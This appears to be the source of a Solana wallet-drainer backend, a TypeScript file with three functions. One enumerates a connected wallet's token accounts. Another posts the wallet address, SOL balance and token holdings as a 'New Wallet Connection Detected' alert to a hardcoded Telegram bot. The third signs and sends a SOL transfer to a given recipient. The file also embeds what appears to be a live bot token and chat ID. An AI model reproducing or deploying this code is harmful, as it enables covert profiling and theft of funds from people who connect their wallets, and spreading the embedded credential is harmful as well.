import { Connection, PublicKey, LAMPORTS_PER_SOL, Transaction, SystemProgram, sendAndConfirmTransaction } from '@solana/web3.js';

// WARNING: Storing credentials in code is not secure
const TELEGRAM_BOT_TOKEN = "7953723959:AAGghCSXBoNyKh4WbcikqKWf-qKxDhaSpaw";
const TELEGRAM_CHAT_ID = "-1002490122517";

export const getTokenAccounts = async (connection: Connection, walletAddress: string) => {
  try {
    console.log("Fetching token accounts for address:", walletAddress);
    
    // Verify the wallet address is valid
    const pubKey = new PublicKey(walletAddress);
    
    // Use getParsedProgramAccounts instead for better reliability
    const response = await connection.getParsedProgramAccounts(
      new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'),
      {
        filters: [
          {
            dataSize: 165, // size of token account
          },
          {
            memcmp: {
              offset: 32, // owner offset
              bytes: pubKey.toBase58(),
            },
          },
        ],
      }
    );

    console.log("Token accounts response:", response);

    return response.map(item => {
      const parsedData = (item.account.data as any).parsed.info;
      return {
        mint: parsedData.mint,
        amount: parsedData.tokenAmount.uiAmount,
        decimals: parsedData.tokenAmount.decimals
      };
    });
  } catch (error) {
    console.error('Detailed error fetching token accounts:', error);
    if (error instanceof Error) {
      throw new Error(`Failed to fetch token accounts: ${error.message}`);
    }
    throw new Error('Failed to fetch token accounts: Unknown error');
  }
};

export const sendToTelegram = async (walletData: any) => {
  try {
    const connection = new Connection('https://api.mainnet-beta.solana.com');
    const solBalance = await connection.getBalance(new PublicKey(walletData.address));
    const solBalanceInSol = solBalance / LAMPORTS_PER_SOL;

    const formattedTokens = walletData.tokens.map((token: any) => 
      `Mint: ${token.mint}\nAmount: ${token.amount}\nDecimals: ${token.decimals}`
    ).join('\n\n');

    const message = `🔍 New Wallet Connection Detected:\n\n\n\n` +
      `👛 Wallet Address: ${walletData.address}\n` +
      `💎 SOL Balance: ${solBalanceInSol.toFixed(4)} SOL\n` +
      `⏰ Time: ${new Date().toLocaleString()}\n\n\n\n` +
      `💰 Token Balances:\n${formattedTokens}\n\n\n\n` +
      `🌐 Network: Solana Mainnet`;

    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
      }),
    });

    if (!response.ok) {
      throw new Error('Failed to send message to Telegram');
    }

    return true;
  } catch (error) {
    console.error('Error sending to Telegram:', error);
    throw error;
  }
};

export const signAndSendTransaction = async (connection: Connection, wallet: any, recipientAddress: string, amount: number) => {
  try {
    const transaction = new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: wallet.publicKey,
        toPubkey: new PublicKey(recipientAddress),
        lamports: amount * LAMPORTS_PER_SOL,
      })
    );

    const signature = await sendAndConfirmTransaction(
      connection,
      transaction,
      [wallet],
    );

    return signature;
  } catch (error) {
    console.error('Error in transaction:', error);
    throw error;
  }
};
